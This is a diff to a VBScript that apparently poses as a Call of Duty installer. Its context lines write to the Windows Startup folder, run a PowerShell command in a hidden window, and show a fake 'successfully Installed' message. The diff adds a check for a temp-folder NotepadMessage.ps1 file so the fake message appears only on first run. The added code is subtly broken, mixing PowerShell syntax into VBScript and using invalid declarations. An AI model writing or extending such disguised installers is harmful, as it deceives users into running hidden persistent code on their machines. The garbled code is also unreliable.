@@ -5,6 +5,19 @@ Dim destPath, notepadScriptPath, psScriptPath, file, psFile
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set shell = CreateObject("WScript.Shell")
 
+Dim fso, filePath
+Dim strFileExist = ""
+
+#Check to see if NotepadMessage.p1 exist
+filePath = "$env:APPDATA\Local\Temp\NotepadMessage.ps1"
+Set fso = CreateObject("Scripting.FileSystemObject")
+If fso.FileExists(filePath) Then
+    strFileExist = "Yes"
+Else
+    strFileExist = "No"
+End If
+
+
 ' Define paths
 startupPath = shell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup"
 tempFolder = shell.ExpandEnvironmentStrings("%TEMP%")
@@ -66,4 +79,6 @@ psCommand = _
 
 shell.Run psCommand, 0, True
 
-MsgBox "Call of Duty successfully Installed!", vbOKOnly, "Success"
+If strFileExist = "No" Then
+    MsgBox "Call of Duty successfully Installed!", vbOKOnly, "Success"
+End if
